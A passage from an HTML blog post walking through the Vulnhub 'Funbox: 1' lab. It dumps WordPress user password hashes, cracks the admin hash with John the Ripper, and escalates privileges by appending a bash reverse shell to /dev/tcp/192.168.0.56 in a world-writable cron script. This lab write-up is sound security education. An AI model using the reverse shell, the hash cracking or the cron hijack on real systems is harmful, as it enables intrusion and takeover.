+<span style="color:#f92672">|</span> wp_postmeta           <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_posts              <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_term_relationships <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_term_taxonomy      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_termmeta           <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_terms              <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_usermeta           <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_users              <span style="color:#f92672">|</span>
+<span style="color:#f92672">+-----------------------+</span>
+<span style="color:#ae81ff">12</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">00</span> sec)
+mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> wp_users;
+<span style="color:#f92672">+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+</span>
+<span style="color:#f92672">|</span> ID <span style="color:#f92672">|</span> user_login <span style="color:#f92672">|</span> user_pass                          <span style="color:#f92672">|</span> user_nicename <span style="color:#f92672">|</span> user_email       <span style="color:#f92672">|</span> user_url <span style="color:#f92672">|</span> user_registered     <span style="color:#f92672">|</span> user_activation_key                           <span style="color:#f92672">|</span> user_status <span style="color:#f92672">|</span> display_name <span style="color:#f92672">|</span>
+<span style="color:#f92672">+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+</span>
+<span style="color:#f92672">|</span>  <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> admin      <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span>P<span style="color:#960050;background-color:#1e0010">$</span>BGUPID16QexYI9XRblG9k8rnr0TMJN1 <span style="color:#f92672">|</span> admin         <span style="color:#f92672">|</span> funny<span style="color:#f92672">@</span>funbox.box <span style="color:#f92672">|</span>          <span style="color:#f92672">|</span> <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">11</span>:<span style="color:#ae81ff">32</span>:<span style="color:#ae81ff">16</span> <span style="color:#f92672">|</span>                                               <span style="color:#f92672">|</span>           <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span> admin        <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>  <span style="color:#ae81ff">2</span> <span style="color:#f92672">|</span> joe        <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span>P<span style="color:#960050;background-color:#1e0010">$</span>BE8LMdNTNUfpD5w3h5q2DnGGalSHcY1 <span style="color:#f92672">|</span> joe           <span style="color:#f92672">|</span> joe<span style="color:#f92672">@</span>funbox.box   <span style="color:#f92672">|</span>          <span style="color:#f92672">|</span> <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">11</span>:<span style="color:#ae81ff">46</span>:<span style="color:#ae81ff">42</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">1592567203</span>:<span style="color:#960050;background-color:#1e0010">$</span>P<span style="color:#960050;background-color:#1e0010">$</span>B7eKG<span style="color:#f92672">/</span><span style="color:#ae81ff">1</span>s3GPGXCUM<span style="color:#f92672">/</span>h.lmWqaZ2Udvq1 <span style="color:#f92672">|</span>           <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span> joe miller   <span style="color:#f92672">|</span>
+<span style="color:#f92672">+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+</span>
+<span style="color:#ae81ff">2</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">00</span> sec)
+
+mysql<span style="color:#f92672">&gt;</span> 
+
+</code></pre></div><p>With the admin hash ( $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1), it was possible to crack it with <strong>John the ripper</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# john hashes.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>phpass <span style="color:#f92672">[</span>phpass <span style="color:#f92672">(</span>$P$ or $H$<span style="color:#f92672">)</span> 256/256 AVX2 8x3<span style="color:#f92672">])</span>
+Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">8192</span> <span style="color:#66d9ef">for</span> all loaded hashes
+Will run <span style="color:#ae81ff">4</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+iubire           <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2020-08-11 21:26<span style="color:#f92672">)</span> 16.66g/s 12800p/s 12800c/s 12800C/s jeffrey..james1
+Use the <span style="color:#e6db74">&#34;--show --format=phpass&#34;</span> options to display all of the cracked passwords reliably
+Session completed
+
+</code></pre></div><p>I could successfully access the admin profile with password <code>iubire</code> in Wordpress, only. It was just a rabbit hole. =( No new information to explore here, and no need to upload a shell payload.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200811213955759_lj7spa.png" alt="image-20200811213955759"></p>
+<h1 id="-privilege-escalation">🛡️ Privilege Escalation</h1>
+<p>The other interesting file found at funny directory is <code>.backup.sh</code>, which is world-writable.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369314/blog/image-20200813220205326_fgmk9x.png" alt="image-20200813220205326"></p>
+<p>I realized that a backup was being made every minute.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">joe@funbox:/home/funny$ ls -lh
+total 47M
+-rw-rw-r-- <span style="color:#ae81ff">1</span> funny funny 47M Aug <span style="color:#ae81ff">12</span> 00:48 html.tar
+joe@funbox:/home/funny$ date
+Wed <span style="color:#ae81ff">12</span> Aug <span style="color:#ae81ff">2020</span> 12:48:15 AM UTC
+</code></pre></div><h1 id="-complete">🍻 Complete</h1>
+<p>I appended the following line with a  Python reverse shell in <code>.backup.sh</code> , and wait for one minute with a netcat listening port in Kali (192.168.0.56).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.56/8080 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200813221101539_megc0i.png" alt="image-20200813221101539"></p>
+<p>Actually it wasn&rsquo;t every minute, but it was executed every <strong>two minutes</strong> with user <code>funny</code>, and every <strong>five minutes</strong> with <code>root</code> user.</p>
+<p>At the first try I could get root shell, but during the writing of this post and replicating the steps for screenshots, I got <strong>funny</strong> user shell. WTF???? And I stood for a long time until get root shell again.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200811215815707_hnojmj.png" alt="image-20200811215815707"></p>
+<p>This way to had to use a tool which I never had used before, <a href="https://github.com/DominicBreuker/pspy">pspy</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+chmod +x pspy64
+./pspy64 -d /home/funny
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369314/blog/image-20200813223326169_yqyln0.png" alt="image-20200813223326169"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369315/blog/image-20200813223549699_ogeffr.png" alt="image-20200813223549699"></p>
+<p>Looking at each crontab, we call see the schedules.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">crontab -u funny -l
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369314/blog/image-20200813222238669_tynkwf.png" alt="image-20200813222238669"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">crontab -u root -l
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369315/blog/image-20200813222301388_etg9ec.png" alt="image-20200813222301388"></p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/vulnhub/">vulnhub</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/hacking/">hacking</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/ctf/">ctf</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/12/devguru-1-vulnhub/" data-tooltip="DevGuru: 1 - Vulnhub ">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/07/photographer-1-vulnhub/" data-tooltip="Photographer: 1 - Vulnhub ">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2022 Tiago Tavares. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/12/devguru-1-vulnhub/" data-tooltip="DevGuru: 1 - Vulnhub ">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/07/photographer-1-vulnhub/" data-tooltip="Photographer: 1 - Vulnhub ">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftiagotavares.io%2F2020%2F08%2Ffunbox-1-vulnhub%2F">
+          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftiagotavares.io%2F2020%2F08%2Ffunbox-1-vulnhub%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Ftiagotavares.io%2F2020%2F08%2Ffunbox-1-vulnhub%2F">
+          <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=110" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Tiago Tavares</h4>
+    
+      <div id="about-card-bio">Eternal student, cybersecurity pro, husband, runner.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Cybersecurity Consultant
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Brazil
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    <div id="cover" style="background-image:url('https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589318923/last_jedi1_ybpjeb.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://tiagotavares.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/tiagotavares.io\/2020\/08\/funbox-1-vulnhub\/';
+          
+            this.page.identifier = '\/2020\/08\/funbox-1-vulnhub\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'tiagotavares-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
